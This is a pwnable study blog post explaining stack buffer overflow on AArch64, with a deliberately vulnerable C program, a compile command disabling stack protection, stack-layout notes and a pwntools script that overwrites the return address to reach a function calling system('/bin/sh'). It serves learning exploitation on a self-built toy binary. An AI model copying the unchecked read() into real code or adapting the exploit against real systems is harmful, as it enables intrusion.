---
title: "[AArch64] Buffer OverFlow"
description: "※ If there are any mistakes, please let us know. We will check and correct it. ※ The concept of Buffer OverFlow can be found at the link below. https://whrdud727.tistory.com/5 [PWNABLE]Stack Buffer OverFlow ※ Please let me know if there is anything wrong. I will edit it after checking."
date: "2024-03-20"
translation_key: "tistory-8a8955e8774c"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow"
private: false
---

**※ If there are any mistakes, please let me know. We will check and correct it. **※**** 

The concept of Buffer OverFlow can be found at the link below.

[https://whrdud727.tistory.com/5](https://whrdud727.tistory.com/5)

 [\[PWNABLE\]Stack Buffer OverFlow

※ If there are any mistakes, please let us know. We will check and correct it. ※ Buffer OverFlow is divided into Stack Buffer OverFlow and Heap Buffer OverFlow depending on the area in which it occurs. Heap will be discussed next

whrdud727.tistory.com](https://whrdud727.tistory.com/5)

[https://whrdud727.tistory.com/6](https://whrdud727.tistory.com/6)

 [\[PWNABLE\]Return Address Overwrite

※ If there are any mistakes, please let us know. We will check and correct it. ※ I briefly discussed Buffer OverFlow in the last post. This time, the ret part located in the Stack Frame, which modulates the Stack,

whrdud727.tistory.com](https://whrdud727.tistory.com/6)

Although the attack principle is the same, caution must be taken because the stack structure is different from the existing x86\_64.

![](/assets/images/tistory/tistory-8a8955e8774c/001.png)

The left is x86\_64, the right is AArch64. The address of ret is at the top of the stack, not at the end.

To reinterpret this, it means that only main() exists and that if a BOF vulnerability occurs within it, it cannot be attacked.

* * *

```
#include <stdio.h>
#include <unistd.h>

void initial(){
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	setvbuf(stderr, 0, 2, 0);
}

void shell(){
	system("/bin/sh");
}

void vuln(){
	char buf[32];
	printf("Exploit\n");
	read(0, buf, 0x100);
	printf("%s\n", buf);
}

int main(){
	char test[0x20];
	initial();
	vuln();;

	return 0;
}
```

This is a C language code that provides system('/bin/sh'); as a gift.

If you look at vuln(), you can see that a BOF vulnerability occurs when entering the buf variable.

```
aarch64-linux-gnu-gcc -no-pie -fno-stack-protector bof.c
```

Compile in the same way as above.

Perform debugging using the method used in the link below.

[https://whrdud727.tistory.com/34](https://whrdud727.tistory.com/34)

 [\[AArch64\] x86\_64 Simple comparison

※ If there are any mistakes, please let us know. We will check and correct it. ※ This architecture is designed for efficient power use and high performance. Mainly used in environments such as smartphones and embedded systems

whrdud727.tistory.com](https://whrdud727.tistory.com/34)

![](/assets/images/tistory/tistory-8a8955e8774c/002.png)

'

Looking at vuln(), -32 is calculated for sp, and in read(), the value is entered into the variable at a distance of 24 from sp.

In other words, out of the stack size of 32, only 24 is used.

The remaining 8 correspond to sfp.

This can be expressed simply as follows:

```
vuln()
[ret_sp-32] - [stack_sp-24] - [bp]
main()
[ret] - [stack_sp] - [bp]
```

Now that we have checked the size of buf, let's enter the value.

![](/assets/images/tistory/tistory-8a8955e8774c/003.png)

Starting with the space of vuln(), ret of main() was overwritten.

![](/assets/images/tistory/tistory-8a8955e8774c/004.png)

x30 is the part that contains the ret address.

I will write the payload right away.

```
from pwn import *

context.log_level = 'debug'
p = process(['qemu-aarch64-static','a.out'])
e = ELF('a.out')
shell = e.sym['shell']#0x00000000004007ac

payload = b'A'*0x28
payload += p64(shell)
p.send(payload)

p.interactive()
```

![](/assets/images/tistory/tistory-8a8955e8774c/005.png)